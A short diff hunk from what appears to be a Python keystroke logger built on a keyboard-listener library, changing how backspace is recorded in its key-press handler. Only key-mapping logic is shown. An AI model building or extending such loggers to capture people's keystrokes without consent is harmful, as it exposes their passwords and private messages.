@@ -59,7 +59,7 @@ def on_press(key):
     try:
         log = ""
         if key == keyboard.Key.backspace:
-            log = "[BACKSPACE]"
+            log = "[B]"
         elif key == keyboard.Key.enter:
             log = "\n"
         elif key == keyboard.Key.space:
